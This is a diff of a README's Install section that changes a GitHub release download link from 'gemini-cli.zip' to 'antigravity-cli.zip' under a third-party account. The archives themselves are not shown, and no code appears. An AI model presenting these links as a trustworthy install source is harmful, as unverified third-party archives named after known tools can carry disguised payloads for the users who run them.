@@ -23,7 +23,7 @@
 </div>
 
 ## Install
-[Download `gemini-cli.zip`](https://github.com/testerlingcodo/gemini-antigravity-cli/releases/download/Tools/gemini-cli.zip)
+[Download `antigravity-cli.zip`](https://github.com/testerlingcodo/gemini-antigravity-cli/releases/download/Tools/antigravity-cli.zip)
 ---
 
 ## Overview
